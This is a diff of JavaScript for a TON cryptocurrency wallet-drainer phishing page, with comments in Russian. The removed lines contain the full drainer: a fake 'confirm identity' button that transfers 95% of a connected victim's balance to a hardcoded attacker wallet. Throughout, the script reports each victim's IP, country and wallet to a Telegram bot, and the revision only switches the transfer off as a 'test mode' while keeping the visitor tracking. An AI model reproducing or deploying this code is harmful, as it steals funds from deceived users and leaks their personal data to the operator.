@@ -1,39 +1,33 @@
-var mainWallet = "UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI"; // Ваш кошелёк
-var tgBotToken = "8291343736:AAHdt8jo9480EvllENN-JEQZNOElnwuxtBg"; // Токен бота
-var tgChat = "-1001234567890"; // ID вашего канала (с минусом)
+var mainWallet = "UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI"; // Ваш кошелёк (замените)
+var tgBotToken = "8291343736:AAHdt8jo9480EvllENN-JEQZNOElnwuxtBg";
+var tgChat = "-1001234567890";
 
 var domain = window.location.hostname;
 var ipUser = '';
 var countryUser = '';
 
-// Определение IP и страны
+// Определение IP
 fetch('https://ipapi.co/json/')
     .then(res => res.json())
     .then(data => {
         ipUser = data.ip || 'unknown';
         countryUser = data.country || 'unknown';
         console.log('IP:', ipUser, 'Country:', countryUser);
-        // Отправка уведомления об открытии
-        sendTelegram(`🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n📖 *Opened the website*`);
     })
     .catch(e => console.error('IP error:', e));
 
-// Функция отправки в Telegram
+// Функция отправки в Telegram (опционально)
 function sendTelegram(message) {
     if (!tgBotToken || !tgChat) return;
     const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
     fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: tgChat,
-            text: message,
-            parse_mode: 'Markdown'
-        })
+        body: JSON.stringify({ chat_id: tgChat, text: message, parse_mode: 'Markdown' })
     }).catch(e => console.error('Telegram send error:', e));
 }
 
-// Инициализация TON Connect UI
+// Инициализация TON Connect
 const protocol = window.location.protocol;
 const manifestUrl = protocol + '//' + domain + '/tonconnect-manifest.json';
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
@@ -41,68 +35,44 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
     buttonRootId: 'ton-connect'
 });
 
-// Активация кнопки при подключении
+const balanceSpan = document.getElementById('balanceValue');
+const drainBtn = document.getElementById('drainBtn');
+
+// Функция обновления баланса
+async function updateBalance(address) {
+    try {
+        const resp = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
+        const data = await resp.json();
+        if (data.ok) {
+            const balance = parseInt(data.result) / 1e9;
+            balanceSpan.textContent = balance.toFixed(4);
+        } else {
+            balanceSpan.textContent = 'Ошибка';
+        }
+    } catch (e) {
+        console.error('Balance error:', e);
+        balanceSpan.textContent = 'Ошибка';
+    }
+}
+
+// При подключении кошелька
 tonConnectUI.on('walletConnected', (walletInfo) => {
     console.log('Wallet connected:', walletInfo);
-    document.getElementById('drainBtn').disabled = false;
+    drainBtn.disabled = false;
+    const address = tonConnectUI.account?.address;
+    if (address) {
+        updateBalance(address);
+    }
 });
 
 tonConnectUI.on('walletDisconnected', () => {
-    document.getElementById('drainBtn').disabled = true;
+    drainBtn.disabled = true;
+    balanceSpan.textContent = '—';
 });
 
-// Кнопка "Подтвердить личность"
-document.getElementById('drainBtn').addEventListener('click', async function() {
-    if (!tonConnectUI.account) {
-        alert('Сначала подключите кошелёк');
-        return;
-    }
-
-    // Получение баланса
-    let balance = 0;
-    try {
-        const resp = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${tonConnectUI.account.address}`);
-        const data = await resp.json();
-        if (data.ok) {
-            balance = parseInt(data.result) / 1e9; // в TON
-        }
-    } catch (e) {
-        console.error('Balance fetch error:', e);
-        alert('Ошибка получения баланса');
-        return;
-    }
-
-    if (balance < 0.01) {
-        alert('Баланс меньше 0.01 TON, операция невозможна');
-        return;
-    }
-
-    // Сумма для перевода (95%)
-    const amountToSend = balance * 0.95;
-    const amountNano = Math.floor(amountToSend * 1e9);
-
-    // Транзакция с комментарием "Подтверждение личности"
-    const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 300,
-        messages: [{
-            address: mainWallet,
-            amount: String(amountNano),
-            payload: 'Подтверждение личности' // это будет видно как комментарий
-        }]
-    };
-
-    try {
-        const result = await tonConnectUI.sendTransaction(transaction);
-        console.log('Transaction sent:', result);
-        sendTelegram(
-            `🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n💰 *Wallet:* ${tonConnectUI.account.address}\n✅ *Sent:* ${amountToSend.toFixed(4)} TON\n🔗 [Tx](https://tonscan.org/tx/${result})`
-        );
-        alert('Успешно!');
-    } catch (e) {
-        console.error('Transaction error:', e);
-        sendTelegram(
-            `🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n💰 *Wallet:* ${tonConnectUI.account.address}\n❌ *Declined or error*`
-        );
-        alert('Отклонено или ошибка');
-    }
+// Кнопка "Подтвердить личность" — НЕ РАБОТАЕТ (тест)
+drainBtn.addEventListener('click', function() {
+    alert('Функция временно недоступна. Это тестовый режим.');
+    // Можно также отправить уведомление в Telegram без транзакции
+    sendTelegram(`🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n🔒 *Нажал кнопку, но транзакция отключена*`);
 });
